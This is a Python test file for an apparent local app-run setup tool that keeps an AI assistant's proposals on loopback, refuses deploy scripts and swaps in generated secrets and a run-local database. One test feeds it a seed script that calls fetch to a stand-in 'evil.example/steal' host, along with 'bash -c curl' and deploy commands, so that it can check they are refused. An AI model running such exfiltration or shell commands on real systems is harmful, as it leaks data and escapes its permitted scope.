"""Automatic run setup: found from the files, never a real .env, never a deploy, the assistant's proposals held to
127.0.0.1, and the run's own environment, database and seed."""
import json
import os
import tempfile
import unittest
from pathlib import Path
from unittest import mock

from eaos import live_setup
from eaos.live_run import LiveRun, load_profile
from eaos.sandbox import AuthorizationError


def project(files):
    root = Path(tempfile.mkdtemp())
    for name, text in files.items():
        (root / name).parent.mkdir(parents=True, exist_ok=True)
        (root / name).write_text(text if isinstance(text, str) else json.dumps(text))
    return root


VITE_APP = {
    'app/package.json': {'name': 'shop', 'scripts': {'dev': 'vite', 'build': 'tsc && vite build', 'start': 'node server.js',
                                                     'lint': 'eslint .', 'test': 'vitest run', 'typecheck': 'tsc --noEmit',
                                                     'deploy': 'railway up', 'migrate': 'node migrate.js'},
                         'dependencies': {'react': '18', 'pg': '8'}, 'devDependencies': {'vite': '5'}},
    'app/package-lock.json': '{}',
    'app/.env.example': 'DATABASE_URL=\nSESSION_SECRET=\nSTRIPE_API_URL=https://api.stripe.com\nLOG_LEVEL=info\nFEATURE_X=true\n',
    'app/.env': 'SESSION_SECRET=the-real-production-secret\n',
    'app/src/main.ts': 'const u = import.meta.env.VITE_API_URL; const m = process.env.MAIL_TOKEN;\n',
}

K6 = """export const options = {
  scenarios: { load: { executor: 'ramping-vus', startVUs: 0, stages: [
    { duration: '1m', target: 100 }, { duration: '3m', target: 100 }, { duration: '1m', target: 0 } ] } },
  thresholds: { http_req_duration: ['p(95)<800'], http_req_failed: ['rate<0.01'] },
};
"""


def bare_run(**fields):
    live = LiveRun.__new__(LiveRun)
    for name, value in fields.items(): setattr(live, name, value)
    return live


class DetectTests(unittest.TestCase):
    def test_a_vite_app_is_found_with_everything_it_needs_and_values_of_its_own(self):
        profile = live_setup.detect(project(VITE_APP))['profile']
        self.assertEqual(profile['app'], 'app')
        self.assertEqual(profile['install'], [['npm', 'ci', '--no-audit', '--no-fund']])
        self.assertEqual(profile['start'][:2], ['npx', 'vite'])
        self.assertIn('127.0.0.1', profile['start'])
        self.assertEqual(profile['checks'], [['npm', 'run', 'typecheck'], ['npm', 'run', 'lint'], ['npm', 'run', 'test']])
        self.assertEqual(profile['database'], {'kind': 'postgres', 'name': profile['database']['name']})
        self.assertEqual(profile['prepare'], [['npm', 'run', 'migrate']])
        self.assertEqual(profile['baseline']['build'], [['npm', 'run', 'build']])
        env = profile['env']
        self.assertEqual(env['DATABASE_URL'], '{database_url}')
        self.assertNotEqual(env['SESSION_SECRET'], 'the-real-production-secret')
        self.assertGreater(len(env['SESSION_SECRET']), 30)
        self.assertEqual(env['STRIPE_API_URL'], 'http://127.0.0.1:9', 'a hosted service becomes an address nobody answers')
        self.assertEqual((env['LOG_LEVEL'], env['FEATURE_X']), ('info', 'true'))
        self.assertIn('VITE_API_URL', env)
        self.assertIn('MAIL_TOKEN', env)

    def test_a_deploy_never_runs_a_missing_pnpm_goes_through_corepack_and_what_cannot_start_is_said(self):
        scripts = {'deploy': 'railway up', 'ship': 'npm run build && npm run deploy', 'build': 'vite build',
                   'reset': 'railway run node reset.js', 'start': 'node server.js'}
        for name, safe in (('deploy', False), ('ship', False), ('reset', False), ('build', True)):
            self.assertEqual(live_setup.script_is_safe(scripts, name), safe, name)
        found = live_setup.detect(project({'package.json': {'scripts': {'dev': 'vercel dev', 'start': 'node s.js'}}}))
        self.assertEqual(found['profile']['start'], ['npm', 'run', 'start'])
        pnpm = project({'package.json': {'scripts': {'dev': 'vite', 'lint': 'eslint .'}, 'devDependencies': {'vite': '5'}},
                        'pnpm-lock.yaml': 'lockfileVersion: 9\n'})
        with mock.patch('shutil.which', side_effect=lambda name: None if name == 'pnpm' else f'/usr/bin/{name}'):
            profile = live_setup.detect(pnpm)['profile']
        self.assertEqual(profile['install'], [['corepack', 'pnpm', 'install', '--frozen-lockfile']])
        self.assertEqual(profile['checks'], [['corepack', 'pnpm', 'run', 'lint']])
        nothing = live_setup.detect(project({'main.py': 'print(1)\n'}))
        self.assertIsNone(nothing['profile'])
        self.assertTrue(nothing['limitations'])
        supabase = live_setup.detect(project({'package.json': {'scripts': {'dev': 'vite'}, 'devDependencies': {'vite': '5'},
                                                               'dependencies': {'@supabase/supabase-js': '2'}}}))
        self.assertTrue(any('Supabase' in l for l in supabase['limitations']))

    def test_the_load_baseline_never_runs_the_dev_server_and_reads_its_conditions_from_the_scenario(self):
        dev_start = {'scripts': {'build': 'vite build', 'start': 'vite', 'dev': 'vite'}, 'devDependencies': {'vite': '5'}}
        _, start = live_setup.production_commands('npm', dev_start, 4000)
        self.assertEqual(start[:3], ['npx', 'vite', 'preview'])
        self.assertEqual(live_setup.production_commands('npm', {'scripts': {'dev': 'node x'}}, 4000), (None, None))
        from eaos.runtime_baseline import shape
        script = Path(tempfile.mkdtemp()) / 'qs-001.js'
        script.write_text(K6)
        self.assertEqual(shape(script), ({'p95_ms': 800.0, 'error_rate': 0.01}, 100, 300, 60))


class ProposalTests(unittest.TestCase):
    def test_an_address_off_this_computer_or_a_deploy_is_refused(self):
        self.assertEqual(live_setup.safe({'env': {'A': 'http://127.0.0.1:5000', 'DB': '{database_url}'},
                                          'start': ['npx', 'vite'], 'seed_script': "fetch('http://localhost:3000/x')"}), [])
        refused = live_setup.safe({'env': {'API': 'https://api.example.com'}, 'start': ['bash', '-c', 'curl x'],
                                   'prepare': [['npx', 'vercel', 'deploy']], 'seed_script': "fetch('https://evil.example/steal')"})
        self.assertEqual(len(refused), 4)
        for words in ('api.example.com', 'bash -c', 'vercel deploy', 'evil.example'):
            self.assertTrue(any(words in reason for reason in refused), words)
        self.assertEqual(live_setup.safe({'install': [['corepack', 'pnpm', 'install']]}), [])

    def test_a_proposal_replaces_the_environment_and_a_production_one_changes_the_baseline_only(self):
        runtime = Path(tempfile.mkdtemp())
        live_setup.write_profile(runtime, {'schema_version': 1, 'install': [['npm', 'ci']], 'start': ['npx', 'vite'], 'port': 1,
                                           'health': '/', 'env': {'OLD': '1', 'DATABASE_URL': '{database_url}'},
                                           'prepare': [['npm', 'run', 'migrate']], 'database': {'kind': 'postgres', 'name': 'x'},
                                           'baseline': {'build': [['npm', 'run', 'build']], 'start': ['npm', 'start'], 'env': {'OLD': '1'}}})
        profile = live_setup.apply(runtime, {'env': {'NEW': '2', 'DATABASE_URL': '{database_url}'}, 'prepare': [], 'database': 'none',
                                             'fixtures': {'E2E_ID': '7'}, 'seed_script': 'console.log(1)'})
        self.assertEqual(profile['env'], {'NEW': '2', 'E2E_ID': '7'})
        self.assertNotIn('prepare', profile)
        self.assertNotIn('database', profile)
        self.assertEqual(profile['seed'][0][0], 'node')
        self.assertTrue((runtime / 'setup/seed.cjs').is_file())
        self.assertEqual(oct((runtime / 'run.json').stat().st_mode & 0o777), '0o600')
        profile = live_setup.apply(runtime, {'env': {'APP_URL': 'https://127.0.0.1:5', 'DATABASE_URL': '{database_url}'},
                                             'build': [['npm', 'run', 'build:server']], 'seed_script': 'x'}, mode='baseline')
        self.assertEqual(profile['env'], {'NEW': '2', 'E2E_ID': '7'}, 'the lock run is untouched')
        self.assertEqual(profile['baseline']['env'], {'APP_URL': 'https://127.0.0.1:5', 'DATABASE_URL': '{database_url}'})
        self.assertEqual(profile['baseline']['build'], [['npm', 'run', 'build:server']])
        with mock.patch('eaos.live_run.Sandbox'), mock.patch('eaos.live_run.head', return_value='c'):
            self.assertEqual(LiveRun('p', runtime, 'S05', mode='baseline').profile['seed'], [], 'the load test signs nobody in')
            self.assertEqual(LiveRun('p', runtime, 'S05').profile['seed'][0][0], 'node')


class VerifyTests(unittest.TestCase):
    def test_a_stuck_page_is_no_working_app_the_assistant_is_asked_until_it_works_and_the_project_is_never_written(self):
        page = {'text': 'Where are you working?', 'others': [{'text': 'Where are you  working?'}, {'text': 'Where are you working?'}]}
        self.assertTrue(live_setup.stuck(page))
        page['others'][1]['text'] = 'People with access'
        self.assertFalse(live_setup.stuck(page))
        self.assertTrue(live_setup.signed_out({'url': 'http://127.0.0.1:5/login?next=/'}))
        self.assertTrue(live_setup.signed_out({'url': 'http://127.0.0.1:5/', 'password': 1}))
        root = project(VITE_APP)
        before = sorted((p.relative_to(root).as_posix(), p.read_bytes()) for p in root.rglob('*') if p.is_file())
        runtime = Path(tempfile.mkdtemp())
        outcomes = iter([{'ok': False, 'failure': 'the first page asks for a sign-in', 'fixtures': {}},
                         {'ok': True, 'page': {'status': 200}, 'fixtures': {'E2E_ID': '1'}}])
        assistant = mock.Mock()
        assistant.complete.return_value = ({'result': {'env': {'DEV_LOGIN': '1'}, 'seed_script': 'console.log("{}")'}}, {})
        with mock.patch.object(live_setup, 'verify', side_effect=lambda *a, **k: next(outcomes)), \
                mock.patch.object(live_setup, 'assist_messages', return_value=[]), \
                mock.patch.object(live_setup, 'setup_baseline', return_value={'ok': False, 'failure': 'APP_URL must be https'}):
            result = live_setup.setup(root, runtime, provider=assistant, say=lambda n: None)
        self.assertEqual((result['ok'], result['attempts']), (True, 2))
        self.assertIn('speed cannot be measured: APP_URL must be https', result['limitations'])
        self.assertEqual(json.loads((runtime / 'run.json').read_text())['env'], {'DEV_LOGIN': '1'})
        failing = {'ok': False, 'failure': 'the first page asks for a sign-in', 'fixtures': {}}
        with mock.patch.object(live_setup, 'verify', return_value=failing):
            result = live_setup.setup(root, Path(tempfile.mkdtemp()), provider=None, say=lambda n: None)
        self.assertFalse(result['ok'])
        self.assertTrue(any('sign-in' in l for l in result['limitations']))
        after = sorted((p.relative_to(root).as_posix(), p.read_bytes()) for p in root.rglob('*') if p.is_file())
        self.assertEqual(before, after)
        runtime = Path(tempfile.mkdtemp())
        detected = live_setup.detect(project(VITE_APP))
        live_setup.write_profile(runtime, detected['profile'])
        outcomes = iter([{'ok': False, 'failure': 'npm exited with 1; it said: APP_URL must be https'}, {'ok': True}])
        assistant = mock.Mock()
        assistant.complete.return_value = ({'result': {'env': {'APP_URL': 'https://127.0.0.1:5'}}}, {})
        with mock.patch.object(live_setup, 'verify', side_effect=lambda *a, **k: next(outcomes)) as runs:
            record = live_setup.setup_baseline(project(VITE_APP), runtime, detected, assistant, say=lambda n: None)
        self.assertTrue(record['ok'])
        self.assertTrue(all(call.kwargs.get('mode') == 'baseline' for call in runs.call_args_list))
        profile = json.loads((runtime / 'run.json').read_text())
        self.assertEqual((profile['baseline']['verified'], profile['baseline']['env']), (True, {'APP_URL': 'https://127.0.0.1:5'}))

    def test_an_empty_no_data_page_is_no_working_app_and_eaos_own_studio_runs_on_its_report_with_its_dark_theme(self):
        # Diagnosis 3 §4: the Studio started without STUDIO_DATA, showed "no report here yet", and was taken as working
        studio = {'studio/package.json': {'scripts': {'dev': 'vite'}, 'devDependencies': {'vite': '8'}},
                  'studio/vite.config.ts': '// In development: STUDIO_DATA=/path/to/report/studio npm run dev\n'
                                           'const folder = process.env.STUDIO_DATA\n',
                  'studio/src/i18n/prefs.tsx': "const KEY = 'eaos.studio'\nexport type Theme = 'light' | 'dark'\n"
                                               "function saved(): { theme?: Theme } { return JSON.parse(localStorage.getItem(KEY) || '{}') }\n"}
        bare = live_setup.detect(project(studio))
        self.assertNotIn('STUDIO_DATA', bare['profile']['env'])
        page = {'status': 200, 'text': 'لا يوجد تقرير هنا بعد'}
        self.assertIn('without a value for: STUDIO_DATA', live_setup.empty_state(page, ['STUDIO_DATA']))
        self.assertEqual(live_setup.empty_state({'text': 'No data yet'}, []), '', 'every value given: an empty page is the app')
        self.assertEqual(live_setup.empty_state({'text': 'Problems: 12 open, 3 waiting for you'}, ['STUDIO_DATA']), '')
        report = Path(tempfile.mkdtemp())
        (report / 'studio').mkdir()
        profile = live_setup.detect(project(studio), report)['profile']
        self.assertEqual(profile['env']['STUDIO_DATA'], str(report / 'studio'))
        self.assertEqual(profile['screens'], {'theme_key': 'eaos.studio', 'theme_field': 'theme'})

    def test_the_assistant_sees_the_source_that_shows_the_problem_not_the_build(self):
        root = project({'app/package.json': {'scripts': {'dev': 'vite'}},
                        'app/vite.config.ts': '// Chief Operations dev server\n',
                        'app/src/ChooseProfile.tsx': '<h1>Where are you working?</h1>\n<p>Each is a separate record, its own people.</p>\n',
                        'app/server/config.ts': '\n'.join(['// config'] * 5 + ['if (!url.startsWith("https://")) problems.push("APP_URL must be an https:// address in production.");']),
                        'app/dist-server/main.mjs': 'problems.push("APP_URL must be an https:// address in production.");'})
        found = live_setup.relevant_source(root, 'app', 'The page says:\nChief Operations\nWhere are you working?\n'
                                                        'Each is a separate record, its own people.')
        self.assertTrue(found.startswith('=== app/src/ChooseProfile.tsx'), found[:80])
        found = live_setup.relevant_source(root, 'app', 'Error: Configuration is not valid:\n - APP_URL must be an https:// address in production.')
        self.assertIn('app/server/config.ts', found)
        self.assertNotIn('dist-server', found)
        self.assertEqual(live_setup.relevant_source(root, 'app', 'short'), '')


class RunEnvironmentTests(unittest.TestCase):
    def test_the_run_has_its_own_database_secrets_and_seed_values_and_never_the_owners(self):
        with tempfile.TemporaryDirectory() as tmp:
            with self.assertRaises(AuthorizationError): load_profile(tmp)
            (Path(tmp) / 'run.json').write_text(json.dumps({'schema_version': 1, 'install': [], 'start': []}))
            with self.assertRaises(AuthorizationError): load_profile(tmp)
        for profile in ({'env': {'DATABASE_URL': '{database_url}'}},       # named by a value, though none was declared
                        {'database': {'kind': 'postgres', 'name': 'app'}, 'env': {'DATABASE_URL': '{database_url}', 'NODE_ENV': 'development'}}):
            live = bare_run(runtime=Path(tempfile.mkdtemp()), profile=profile)
            with mock.patch.dict(os.environ, {'DATABASE_URL': 'postgres://owner@production.example/live', 'OWNER_SECRET_TOKEN': 'x'}), \
                    mock.patch('eaos.local_db.LocalPostgres') as database:
                database.return_value.create.return_value = 'postgresql://postgres@127.0.0.1:5/app'
                extra = live.extra()
            self.assertEqual(extra['DATABASE_URL'], 'postgresql://postgres@127.0.0.1:5/app')
            database.return_value.create.assert_called_once_with('app')
            self.assertNotIn('OWNER_SECRET_TOKEN', extra)
            self.assertGreaterEqual(len(extra['AUTH_SECRET']), 48, 'generated for the run')
        for printed in ('signed in\n{"E2E_PROFILEID": "p1", "other": "x"}\n', '{"E2E_PROFILEID": "p1"}\nsigned in: true\n{"debug": 1}\n'):
            live = bare_run(profile={'seed': [['node', 'seed.cjs']]}, fixtures={}, _extra={'PATH': '/bin'})
            live.run = mock.Mock(return_value=(0, printed, ''))
            self.assertEqual(live.seed('http://127.0.0.1:5'), {'E2E_PROFILEID': 'p1'})
            self.assertEqual(live.extra()['E2E_PROFILEID'], 'p1')
            self.assertIn('signed in', live.seed_output)

    def test_a_database_of_the_runs_own_on_loopback_even_deep_in_a_home(self):
        from eaos.local_db import LocalPostgres, binaries
        if binaries() is None: self.skipTest('no PostgreSQL binaries')
        deep = Path(tempfile.mkdtemp()) / ('.eaos/projects/chief-fellow-ops-spec-2b5adcc3/' + 'runtime/' * 6)
        db = LocalPostgres(deep)
        self.assertGreater(len(str(db.root)), 110, 'deeper than a Unix socket path may be')
        try:
            url = db.create('shop')
            self.assertRegex(url, r'^postgresql://postgres@127\.0\.0\.1:\d+/shop$')
            self.assertEqual(db.start().rsplit('/', 1)[0], url.rsplit('/', 1)[0], 'a running server is reused')
        finally:
            db.stop()
        self.assertIsNone(db.running())


if __name__ == '__main__':
    unittest.main()
